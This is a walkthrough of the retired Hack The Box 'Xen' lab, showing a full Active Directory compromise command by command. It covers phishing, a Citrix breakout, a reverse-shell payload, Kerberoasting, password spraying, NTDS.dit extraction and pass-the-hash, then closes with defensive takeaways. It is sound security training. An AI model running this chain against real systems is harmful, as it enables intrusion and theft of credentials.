---
title: "Hack The Box Pro Lab — Xen"
summary: "Xen chains SMTP phishing, a Citrix breakout, Windows privilege escalation, Kerberoasting, pivoting, NetScaler traffic capture and Backup Operators abuse into full Active Directory compromise."
platform: "Hack The Box"
contentType: "pro-lab"
publicationPolicy: "retired"
difficulty: "Hard"
solvedAt: 2026-09-21
publishedAt: 2026-09-21
tags:
  - active-directory
  - citrix
  - phishing
  - smtp-enumeration
  - windows-breakout
  - always-install-elevated
  - kerberoasting
  - pivoting
  - password-spraying
  - netscaler
  - packet-capture
  - backup-operators
  - credential-dumping
  - pass-the-hash
tools:
  - Nmap
  - Gobuster
  - smtp-user-enum
  - swaks
  - Citrix Receiver
  - PowerUp
  - Metasploit
  - Impacket
  - Hashcat
  - NetExec
  - John the Ripper
  - PuTTYgen
  - tcpdump
  - Wireshark
  - Evil-WinRM
  - DiskShadow
cves: []
htbUrl: "https://app.hackthebox.com/prolabs/10"
cover: "/images/writeups/hackthebox/pro-labs/xen/xen.webp"
coverAlt: "Hack The Box Xen Mini Pro Lab artwork with a purple futuristic city"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Mini Pro Lab Xen. Every command and credential belongs only to the isolated HTB environment. The six flag values, my VPN address, session tokens and personal identifiers are intentionally omitted.

## Introduction

Xen is a compact enterprise compromise rather than a single-host machine. The external entry point exposes a legacy Citrix environment. The attack begins with SMTP user enumeration and a simulated phishing workflow, moves through a restricted virtual desktop, and then crosses into an internal Active Directory network. From there, the path combines Kerberoasting, an SMB share, an encrypted PuTTY key, NetScaler packet capture, password reuse and `SeBackupPrivilege` abuse to reach the domain administrator account.

This is a reconstruction of my completed solve on 21 September 2026. I keep the commands reproducible, include the mistakes that mattered, and identify every flag location without publishing the values.

## Lab information

| Item | Value |
| --- | --- |
| Lab | Xen Mini Pro Lab |
| Platform | Hack The Box |
| Creator | egre55 |
| Release date | 11 May 2019 |
| Retired date | 16 June 2020 |
| External entry point | `10.13.38.12` |
| External domain | `humongousretail.com` |
| AD domain | `HTB.LOCAL` |
| Flags | 6, values omitted |

The external target and internal addresses are fixed for this retired lab. Replace `<VPN_IP>` with the address of the HTB VPN interface assigned to your own session.

## Network topology

```text
Kali (<VPN_IP>)
    |
    | HTB VPN
    v
10.13.38.12  External IIS / SMTP / Citrix gateway
    |
    v
VDESKTOP1
  10.13.38.13    external lab segment
  172.16.249.203 internal segment
    |
    +-- 172.16.249.200  DC.htb.local       Domain Controller
    +-- 172.16.249.201  CITRIX.htb.local   Citrix server / SMB share
    +-- 172.16.249.202  NetScaler          FreeBSD appliance
    +-- 172.16.249.204  VDESKTOP2
    +-- 172.16.249.205  VDESKTOP3
```

## Attack path

| Stage | Evidence | Result |
| --- | --- | --- |
| Perimeter enumeration | SMTP, HTTP and HTTPS exposed | Citrix portal and enumerable mail recipients |
| Simulated phishing | Automated user visited the supplied URL | Captured valid `HTB.LOCAL` credentials |
| Citrix access | Downloaded ICA launch file | Interactive session on `VDESKTOP1` |
| Desktop breakout | User-created batch file launched `cmd.exe` | Shell inside the restricted desktop |
| Local privilege escalation | Both `AlwaysInstallElevated` policies were enabled | `NT AUTHORITY\\SYSTEM` Meterpreter session |
| Pivot | Dual-homed desktop and Metasploit autoroute | SOCKS access to `172.16.249.0/24` |
| Kerberoasting | MSSQL SPN assigned to `mturner` | Recovered credentials for the Citrix share |
| SMB enumeration | `Citrix$` contained a flag and `private.ppk` | Encrypted SSH key recovered |
| NetScaler access | Cracked PuTTY key and used `nsroot` | Root shell on the FreeBSD appliance |
| Traffic capture | HTTP and LDAP crossed NetScaler | Flag in HTTP and plaintext LDAP bind credentials |
| Password spray | Service password reused across accounts | WinRM access as `backup-svc` on the DC |
| Backup Operators abuse | `SeBackupPrivilege` and `SeRestorePrivilege` enabled | Copied `NTDS.dit` and the SYSTEM hive |
| Pass-the-hash | Administrator NT hash recovered offline | Domain administrator shell and final flag |

## 1. Perimeter enumeration

I created a small workspace and confirmed that the VPN route reached the target:

```bash
mkdir -p scans loot notes
export TARGET=10.13.38.12
export LHOST='<VPN_IP>'

ip -br address | grep -E 'tun|tap'
ip route get "$TARGET"
ping -c 2 "$TARGET"
```

The target replied with a Windows-like TTL. A full TCP scan found only three ports:

```bash
sudo nmap -Pn -n -p- --min-rate 1500 --max-retries 2 -T4 \
  -oA scans/01-all-tcp "$TARGET"
```

```text
PORT    STATE SERVICE
25/tcp  open  smtp
80/tcp  open  http
443/tcp open  https
```

I followed with scripts and service detection:

```bash
sudo nmap -Pn -n -sC -sV --version-all -p25,80,443 \
  -oA scans/02-services "$TARGET"
```

Port 80 redirected to `https://humongousretail.com/`, IIS identified itself as version 7.5, and SMTP disclosed `EXCHANGE.HTB.LOCAL`:

```bash
curl -sSI --max-time 15 "http://$TARGET/"
nc -nv "$TARGET" 25
```

The TLS service is old enough that modern clients may refuse it. The certificate still confirms the intended hostname:

```bash
timeout 15 openssl s_client -connect "$TARGET:443" 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
```

```text
subject=CN=humongousretail.com
X509v3 Subject Alternative Name:
    DNS:humongousretail.com
```

I added the names locally:

```bash
echo '10.13.38.12 humongousretail.com exchange.htb.local' \
  | sudo tee -a /etc/hosts
```

For a modern Firefox installation, I used a temporary profile and allowed the legacy TLS version only for this isolated lab. That setting must be reverted after the session.

### Discovering the Citrix path

Directory enumeration revealed `/remote/`:

```bash
gobuster dir -k \
  -u https://humongousretail.com/ \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -x asp,aspx,txt -t 20 -o scans/03-gobuster.txt
```

The useful result was:

```text
/remote  (Status: 301)
```

Opening `https://humongousretail.com/remote/` presented a Citrix XenApp portal, but no credentials were available yet.

### SMTP recipient enumeration

The SMTP service distinguished valid recipients with the `RCPT TO` workflow:

```bash
smtp-user-enum \
  -U /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt \
  -D humongousretail.com \
  -t "$TARGET" \
  -m 50 \
  -M RCPT \
  | tee scans/04-smtp-user-enum.txt
```

The valid mailboxes included `it`, `legal`, `marketing` and `sales`. The group mailbox `sales@humongousretail.com` became the phishing target.

## 2. Simulated phishing and Citrix access

This step is part of the lab's automation. A message from the IT mailbox to Sales, containing the word `citrix` and an HTTP URL, causes a simulated user to visit the supplied address and submit credentials.

I started a listener on TCP 80:

```bash
sudo python3 -m http.server 80
```

In a second terminal I sent the message:

```bash
swaks \
  --to sales@humongousretail.com \
  --from it@humongousretail.com \
  --header 'Subject: Citrix credentials test' \
  --body "Please verify Citrix access at http://$LHOST/" \
  --server "$TARGET"
```

The Python server returned `501` because it does not implement POST, but its log still exposed the query string:

```text
POST /remote/auth/login.aspx?LoginType=Explicit&user=awardel&password=<REDACTED>&domain=HTB.LOCAL
```

The credential captured during my solve was:

```text
HTB.LOCAL\awardel : @M3m3ntoM0ri@
```

This is a retired-lab credential. Different runs may return one of several Sales users because the lab tries to reduce collisions between concurrent players.

### Launching the virtual desktop

After authenticating to `/remote/`, the portal displayed one resource named `Default`. Selecting it downloaded `launch.ica`.

The portal expects a legacy Citrix Receiver. I installed the supplied 64-bit Linux package into its default path:

```bash
mkdir -p citrix-13.10
tar xf linuxx64-13.10.0.20.tar.gz -C citrix-13.10
cd citrix-13.10
sudo ./setupwfc
```

The receiver binary should then exist at:

```bash
/opt/Citrix/ICAClient/wfica
```

On current Kali releases the old client may require GTK2 compatibility packages and `libidn.so.11`. I checked missing libraries before launch:

```bash
ldd /opt/Citrix/ICAClient/wfica | grep 'not found'
```

Once the compatibility library directory was ready, I launched the desktop in a manageable window:

```bash
export CITRIX_COMPAT="$PWD/compat/libidn11/lib/x86_64-linux-gnu"

LD_LIBRARY_PATH="$CITRIX_COMPAT" \
  /opt/Citrix/ICAClient/wfica \
  -geometry 1200x700+20+20 \
  "$PWD/launch.ica"
```

If the ICA file has expired, download a fresh copy from the authenticated portal. The first flag is on the virtual user's desktop; I submitted it without copying its value into my notes.

## 3. Escaping the restricted desktop

The session hid Command Prompt and PowerShell from the Start menu and restricted browsing into `C:\Windows\System32`. The restriction controlled the shell UI, not process execution.

From the user's Documents folder I created a text file containing:

```bat
cmd.exe
```

I saved it as `cmd.bat` with **Save as type: All files** and opened it. This launched a normal command prompt. Basic situational awareness showed the user and the dual-homed workstation:

```cmd
whoami
hostname
ipconfig
whoami /groups
whoami /priv
```

```text
htb\awardel
VDESKTOP1
10.13.38.13
172.16.249.203
```

The second interface exposed the internal `172.16.249.0/24` network.

## 4. Local privilege escalation on VDESKTOP1

I checked the two Windows Installer policy locations:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both returned:

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

When both the user and machine policies are enabled, any MSI launched by the user can install with elevated privileges.

### Creating a local administrator with PowerUp

I served PowerUp from Kali:

```bash
locate PowerUp.ps1 | head
sudo python3 -m http.server 80 --directory /usr/share/windows-resources/powersploit/Privesc
```

From the Citrix command prompt:

```cmd
certutil -urlcache -split -f http://<VPN_IP>/PowerUp.ps1 PowerUp.ps1
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1; Write-UserAddMSI"
start "" UserAdd.msi
```

The MSI wizard created a local account and added it to `Administrators`. I used `xenadmin` with a password satisfying the Windows complexity policy, then verified it:

```cmd
net user xenadmin
net localgroup Administrators
runas /user:.\xenadmin cmd.exe
```

The second flag is on `C:\Users\Administrator\Desktop\flag.txt`. A high-integrity shell or the SYSTEM session created below can read it; the value is omitted here.

### Obtaining a SYSTEM Meterpreter session

Meterpreter simplified routing through the dual-homed workstation. On Kali I generated a payload and started a handler:

```bash
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<VPN_IP> LPORT=443 \
  -f exe -o loot/xen443.exe
```

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <VPN_IP>
set LPORT 443
set ExitOnSession false
run
```

I delivered and ran `xen443.exe` inside the desktop. From the initial Meterpreter session I used the matching local module:

```text
background
use exploit/windows/local/always_install_elevated
set SESSION <AWARDEL_SESSION_ID>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <VPN_IP>
set LPORT 4444
run
```

The new session confirmed the expected security context:

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## 5. Pivoting into the internal network

From the SYSTEM session I confirmed the domain controller:

```text
meterpreter > shell
C:\> ping -n 1 dc
Pinging DC.htb.local [172.16.249.200]
```

I added an internal route through the compromised desktop:

```text
background
use post/multi/manage/autoroute
set SESSION <SYSTEM_SESSION_ID>
set CMD add
set SUBNET 172.16.249.0
set NETMASK 255.255.255.0
run
route print
```

Then I exposed that route through a local SOCKS4a listener:

```text
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j
jobs
```

I used a task-specific ProxyChains configuration so the system file remained untouched:

```bash
cp /etc/proxychains4.conf proxychains-xen.conf
sed -i -E '/^[[:space:]]*(socks4|socks5|http)[[:space:]]/d' proxychains-xen.conf
echo 'socks4 127.0.0.1 1080' >> proxychains-xen.conf
```

Because SOCKS proxies carry TCP streams rather than raw packets, proxied Nmap must use `-sT`; even then, direct application checks are often more reliable than scan-state labels.

## 6. Kerberoasting and the Citrix share

The compromised domain credential was sufficient to request service tickets. I asked the DC for accounts with SPNs and saved the crackable TGS:

```bash
proxychains4 -f proxychains-xen.conf -q \
  impacket-GetUserSPNs \
  -request \
  -dc-ip 172.16.249.200 \
  'HTB.LOCAL/awardel:@M3m3ntoM0ri@' \
  -outputfile loot/kerberoast.txt
```

The result identified `mturner` through an MSSQL SPN. I cracked the `$krb5tgs$23$` material with Hashcat mode 13100 and the `dive.rule` mutations:

```bash
hashcat -m 13100 loot/kerberoast.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/dive.rule

hashcat -m 13100 loot/kerberoast.txt --show
```

The recovered retired-lab credential was:

```text
HTB.LOCAL\mturner : 4install!
```

### Enumerating SMB

I validated the credential and listed shares on `CITRIX`:

```bash
proxychains4 -f proxychains-xen.conf -q \
  nxc smb 172.16.249.201 -d HTB.LOCAL -u mturner -p '4install!' --shares
```

The interesting share was `Citrix$`. From the Windows foothold, the equivalent commands were:

```cmd
net use \\172.16.249.201\citrix$ /user:HTB\mturner 4install!
dir \\172.16.249.201\citrix$
```

It contained:

```text
Deploying-XenServer-5.6.pdf
XenServer-5-6-SHG.pdf
flag.txt
private.ppk
```

`flag.txt` is the third flag. I copied `private.ppk` to the desktop and downloaded it through Meterpreter:

```cmd
copy \\172.16.249.201\citrix$\private.ppk C:\Windows\Temp\private.ppk
```

```text
meterpreter > download C:\Windows\Temp\private.ppk loot/private.ppk
```

## 7. Cracking the PuTTY key

On current Kali, `putty2john` may be an ELF binary rather than a Python script. Running it through `python3` produces a null-byte syntax error; execute it directly:

```bash
putty2john loot/private.ppk > loot/private.ppk.john
```

The passphrase is a keyboard walk, so ordinary dictionaries are a poor fit. I generated candidates with Hashcat's `kwprocessor`:

```bash
git clone https://github.com/hashcat/kwprocessor.git
cd kwprocessor
./kwp \
  basechars/full.base \
  keymaps/en-us.keymap \
  routes/2-to-16-max-3-direction-changes.route \
  > ../loot/keyboard-walks.txt
cd ..

john --wordlist=loot/keyboard-walks.txt loot/private.ppk.john
john --show loot/private.ppk.john
```

John recovered the retired-lab key passphrase:

```text
=-09876567890-=-
```

I converted the PuTTY key into OpenSSH format. When prompted for the new passphrase, pressing Enter twice stores an unencrypted lab key; alternatively, set a new passphrase and supply it during SSH:

```bash
puttygen loot/private.ppk \
  -O private-openssh \
  -o loot/private.pem \
  -P

chmod 600 loot/private.pem
```

## 8. NetScaler compromise and packet capture

The internal host at `172.16.249.202` returned a Unix-like TTL and matched the NetScaler appliance. The correct administrative SSH user was `nsroot`. Because the appliance only supports legacy SSH algorithms, I enabled them for this connection only:

```bash
proxychains4 -f proxychains-xen.conf \
  ssh \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -o KexAlgorithms=+diffie-hellman-group1-sha1 \
  -i loot/private.pem \
  nsroot@172.16.249.202
```

The initial prompt was the restricted NetScaler CLI, where normal commands such as `ls` do not exist. The administrative account was permitted to enter the underlying shell:

```text
> shell
root@netscaler# id
```

### Capturing traffic

I captured full packets while excluding my SSH session:

```sh
tcpdump -i 1 -w /root/.d.pcap -s 0 'not tcp port 22' &
echo $!
ls -lh /root/.d.pcap
kill <TCPDUMP_PID>
```

After the file had grown, I exited and copied it to Kali:

```bash
proxychains4 -f proxychains-xen.conf \
  scp -O \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -o KexAlgorithms=+diffie-hellman-group1-sha1 \
  -i loot/private.pem \
  nsroot@172.16.249.202:/root/.d.pcap \
  loot/camouflage.pcap
```

The path matters: because `tcpdump` was started from `/root`, the capture was `/root/.d.pcap`, not `/tmp/.d/.d.pcap`.

### Reading HTTP and LDAP

Wireshark showed HTTP traffic between NetScaler and Citrix, plus LDAP traffic between NetScaler and the DC. The fourth flag appeared inside an HTTP POST request. The value is omitted, but this display filter reaches it:

```text
http.request.method == "POST"
```

The LDAP traffic was even more valuable. A simple bind exposed a service identity and password in plaintext. Useful filters were:

```text
ldap
ldap.bindRequest
tcp.port == 389
```

Expanding `Lightweight Directory Access Protocol > bindRequest` revealed:

```text
CN=netscaler-svc,OU=Service Accounts,DC=HTB,DC=LOCAL
#S3rvice#@cc
```

## 9. Password spraying service accounts

The flag name and the generic-looking service password suggested reuse. I created a small user list:

```bash
cat > loot/svc-users.txt <<'EOF'
app-svc
backup-svc
mssql-svc
netscaler-svc
print-svc
test-svc
xenserver-svc
EOF
```

I stored the password in a shell variable to avoid repeating it in history:

```bash
read -s "SVCPASS?LDAP password: "
echo
```

Then I sprayed the single observed password across the narrow service-account list:

```bash
proxychains4 -f proxychains-xen.conf -q \
  nxc smb 172.16.249.201 \
  -d HTB.LOCAL \
  -u loot/svc-users.txt \
  -p "$SVCPASS" \
  --continue-on-success
```

Several service accounts reused the password. `backup-svc` was the important one because it could use WinRM on the domain controller.

## 10. WinRM access to the domain controller

Long-lived WinRM traffic was more stable through a Meterpreter port forward than through ProxyChains. From the SYSTEM session:

```text
meterpreter > portfwd add -L 127.0.0.1 -l 15985 -p 5985 -r 172.16.249.200
meterpreter > portfwd list
```

From Kali:

```bash
evil-winrm -i 127.0.0.1 -P 15985 -u backup-svc -p "$SVCPASS"
```

The fifth flag was on:

```text
C:\Users\backup-svc\Desktop\flag.txt
```

I recorded the location and submitted the value without publishing it.

Enumeration showed why this account was dangerous:

```powershell
whoami /groups
whoami /priv
```

```text
BUILTIN\Backup Operators
SeBackupPrivilege   Back up files and directories   Enabled
SeRestorePrivilege  Restore files and directories  Enabled
```

## 11. Abusing Backup Operators

The Active Directory database cannot be copied directly while the DC is running. The reliable path is:

1. Enable the token's backup privilege.
2. Create and expose a Volume Shadow Copy.
3. Copy `NTDS.dit` from the snapshot with backup semantics.
4. Save the live SYSTEM hive.
5. Download both artifacts and decrypt the hashes offline.

### Loading the SeBackupPrivilege cmdlets

On Kali I cloned the helper project:

```bash
git clone https://github.com/giuliano108/SeBackupPrivilege.git
```

Inside Evil-WinRM I first changed to the intended destination. Without this step, Evil-WinRM may concatenate a Windows destination path to the current directory:

```powershell
cd C:\Windows\Temp
upload /home/kali/Documents/HackTheBox/Xen/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
upload /home/kali/Documents/HackTheBox/Xen/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
```

I imported both modules and enabled the privilege:

```powershell
Import-Module C:\Windows\Temp\SeBackupPrivilegeUtils.dll
Import-Module C:\Windows\Temp\SeBackupPrivilegeCmdLets.dll
Get-Command *SeBackupPrivilege*
Set-SeBackupPrivilege
whoami /priv | Select-String 'SeBackup|SeRestore'
```

### Creating the shadow copy

I wrote a DiskShadow script with ordinary Windows paths; no backslash escaping is required in PowerShell:

```powershell
@(
  'set context persistent nowriters',
  'set metadata C:\Windows\Temp\meta.cab',
  'add volume C: alias cdrive',
  'create',
  'expose %cdrive% U:'
) | Set-Content -Path C:\Windows\Temp\shadow.txt -Encoding ASCII

Get-Content C:\Windows\Temp\shadow.txt
```

Running `diskshadow.exe` interactively made my Evil-WinRM connection appear to drop. Starting it as a separate process and redirecting output was more reliable:

```powershell
Start-Process \
  -FilePath C:\Windows\System32\diskshadow.exe \
  -ArgumentList '/s C:\Windows\Temp\shadow.txt' \
  -RedirectStandardOutput C:\Windows\Temp\diskshadow.log \
  -RedirectStandardError C:\Windows\Temp\diskshadow.err \
  -WindowStyle Hidden

Start-Sleep -Seconds 10
Get-Content C:\Windows\Temp\diskshadow.log
Get-Content C:\Windows\Temp\diskshadow.err
Test-Path U:\Windows\NTDS\ntds.dit
```

The log confirmed that the snapshot was exposed as `U:`.

### Copying the AD database and SYSTEM hive

I re-imported the modules if Evil-WinRM had reconnected, then copied the protected database using backup semantics:

```powershell
Import-Module C:\Windows\Temp\SeBackupPrivilegeUtils.dll
Import-Module C:\Windows\Temp\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege

Copy-FileSeBackupPrivilege \
  U:\Windows\NTDS\ntds.dit \
  C:\Windows\Temp\ntds.dit \
  -Overwrite

reg.exe save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y

Get-Item C:\Windows\Temp\ntds.dit,C:\Windows\Temp\SYSTEM.hive
```

I downloaded the two artifacts before touching the pivot:

```text
download C:\Windows\Temp\ntds.dit /home/kali/Documents/HackTheBox/Xen/loot/ntds.dit
download C:\Windows\Temp\SYSTEM.hive /home/kali/Documents/HackTheBox/Xen/loot/SYSTEM.hive
```

If the Meterpreter pivot dies, recreate the session, route and port forward; the files already copied into `C:\Windows\Temp` remain available until the lab is reset.

## 12. Offline hash extraction and domain compromise

Back on Kali I parsed the database locally:

```bash
impacket-secretsdump \
  -system loot/SYSTEM.hive \
  -ntds loot/ntds.dit \
  LOCAL \
  | tee loot/secretsdump.txt
```

The output contained domain account records in the form:

```text
domain\user:RID:LM_HASH:NT_HASH:::
```

I extracted the Administrator NT hash into a variable without publishing it:

```bash
export ADMIN_NT="$(awk -F: '/^Administrator:500:/{print $4; exit}' loot/secretsdump.txt)"
test -n "$ADMIN_NT" && echo '[+] Administrator NT hash loaded'
```

With the SOCKS pivot restored, pass-the-hash produced a domain administrator shell:

```bash
proxychains4 -f proxychains-xen.conf -q \
  impacket-wmiexec \
  -hashes "aad3b435b51404eeaad3b435b51404ee:$ADMIN_NT" \
  'HTB.LOCAL/Administrator@172.16.249.200'
```

I verified the identity and located the final flag:

```cmd
whoami
cd C:\Users\Administrator\Desktop
dir
type flag.txt
```

The returned identity was `htb\administrator`. I submitted the sixth flag and left its value out of this write-up.

## Flag locations

| Flag | Location or evidence |
| --- | --- |
| Breach | Desktop of the Citrix user on `VDESKTOP1` |
| Deploy | `C:\Users\Administrator\Desktop\flag.txt` on `VDESKTOP1` |
| Ghost | `\\172.16.249.201\Citrix$\flag.txt` |
| Camouflage | HTTP POST content in the NetScaler packet capture |
| Doppelgänger | `C:\Users\backup-svc\Desktop\flag.txt` on the DC |
| owned | `C:\Users\Administrator\Desktop\flag.txt` on the DC |

## What did not work

| Attempt | Observed result | Adjustment |
| --- | --- | --- |
| Modern TLS defaults | Browser and curl rejected the old server protocol | Used a temporary lab-only browser profile with legacy TLS enabled |
| Citrix Receiver on current Kali | Missing `libgtk-x11-2.0.so.0` and `libidn.so.11` | Installed GTK2 compatibility and supplied a local legacy `libidn` path |
| Running `python3 /usr/sbin/putty2john` | Python reported null bytes | Executed the ELF tool directly as `putty2john` |
| PuTTY key conversion | New passphrase was accidentally set during conversion | Either leave the new passphrase blank or remember and use the replacement |
| `scp` from `/tmp/.d/.d.pcap` | File not found | Located the real file at `/root/.d.pcap` |
| Nmap through SOCKS | Ports appeared filtered despite working services | Used TCP connect mode and direct application clients |
| Evil-WinRM upload with a Windows destination | Destination was concatenated to the current directory | Changed into `C:\Windows\Temp` before `upload` |
| `diskshadow.exe` in the interactive WinRM shell | Keep-alive disconnect | Used `Start-Process` with output redirection and checked the log afterward |
| Meterpreter pivot | Session eventually died | Re-established the callback, autoroute, SOCKS proxy and port forward |

## Lessons learned

- A small perimeter can hide a much larger internal environment. Three exposed ports ultimately led to six hosts and a domain controller.
- SMTP recipient validation and realistic business context were enough to turn a mail service into Citrix credentials.
- Application restrictions are not security boundaries. A user-writable batch file bypassed the desktop shell restrictions immediately.
- `AlwaysInstallElevated` is especially dangerous when both policy locations are enabled; it converts any user-controlled MSI into local SYSTEM execution.
- A dual-homed VDI is a natural pivot point. Protecting the perimeter is not sufficient when desktops can reach management networks directly.
- Kerberoasting was valuable because the service account password was human-generated and crackable with common mutations.
- Credentials and keys found on shares should be treated as infrastructure secrets. The PuTTY key led directly to the NetScaler administrative account.
- Plain LDAP binds exposed a reusable service password to anyone capable of observing the traffic path.
- Password spraying should be narrow and evidence-led. Testing one observed password against a short service-account list found the critical `backup-svc` account.
- Backup Operators are effectively high-impact administrators on a domain controller. `SeBackupPrivilege` enabled offline extraction of the entire directory database.

## Defensive takeaways

| Weakness | Defensive action |
| --- | --- |
| SMTP recipient enumeration | Normalize recipient responses, rate-limit probes and monitor high-volume `RCPT TO` failures |
| Simulated user credential submission | Train users, deploy phishing-resistant MFA and isolate remote-access credentials |
| Legacy Citrix and TLS | Upgrade unsupported Citrix components and disable SSLv2/TLS 1.0 |
| Desktop-shell breakout | Treat application allow-listing and least privilege as controls; UI restrictions alone are insufficient |
| `AlwaysInstallElevated` | Disable both policy values and audit endpoints for the configuration |
| Dual-homed VDI | Segment VDI networks and restrict east-west access with host and network firewalls |
| Kerberoastable service account | Use gMSAs or long random passwords, minimize SPNs and monitor unusual TGS requests |
| Sensitive SMB share | Apply least-privileged ACLs and remove private keys from general-purpose shares |
| Reusable encrypted key | Use per-system keys, hardware-backed storage where possible and rotation after exposure |
| Plain LDAP bind | Require LDAP signing and channel binding; prefer LDAPS with certificate validation |
| Shared service password | Assign unique generated credentials to every service identity |
| Backup Operators on the DC | Strictly limit membership, use privileged access workstations and alert on shadow-copy plus hive access |
| Pass-the-hash | Protect privileged hashes, use tiered administration and restrict remote administration protocols |

## Cleanup

In the lab I removed or stopped temporary artifacts after confirming completion:

```powershell
Remove-Item C:\Windows\Temp\ntds.dit,C:\Windows\Temp\SYSTEM.hive -Force
Remove-Item C:\Windows\Temp\shadow.txt,C:\Windows\Temp\diskshadow.log,C:\Windows\Temp\diskshadow.err -Force
```

I also stopped the Metasploit jobs, closed the Citrix session, deleted local payload files from the VDI, and restored Firefox's TLS and proxy settings. On a resettable HTB target this is mostly operational hygiene, but practicing cleanup is part of a professional workflow.

## Tools used

| Tool | Purpose |
| --- | --- |
| Nmap / Gobuster | Perimeter service and content enumeration |
| smtp-user-enum / swaks | Mailbox discovery and lab phishing delivery |
| Citrix Receiver | ICA virtual desktop access |
| PowerUp / Metasploit | Windows misconfiguration discovery, privilege escalation and pivoting |
| Impacket / Hashcat | Kerberoasting, offline hash extraction and pass-the-hash |
| NetExec | SMB validation, share enumeration and narrow password spraying |
| John / kwprocessor / PuTTYgen | PuTTY key recovery and conversion |
| tcpdump / Wireshark | NetScaler traffic capture and protocol analysis |
| Evil-WinRM / DiskShadow | Remote DC access, VSS creation and Backup Operators abuse |

## References

- [Hack The Box — Xen Mini Pro Lab](https://app.hackthebox.com/prolabs/10)
- [Microsoft: AlwaysInstallElevated policy](https://learn.microsoft.com/windows/win32/msi/alwaysinstallelevated)
- [Microsoft: SeBackupPrivilege](https://learn.microsoft.com/windows-hardware/drivers/ifs/privileges)
- [Microsoft: DiskShadow](https://learn.microsoft.com/windows-server/administration/windows-commands/diskshadow)
- [Impacket](https://github.com/fortra/impacket)
- [SeBackupPrivilege project](https://github.com/giuliano108/SeBackupPrivilege)
- [Return to the Pro Labs archive](/writeups/pro-labs/)
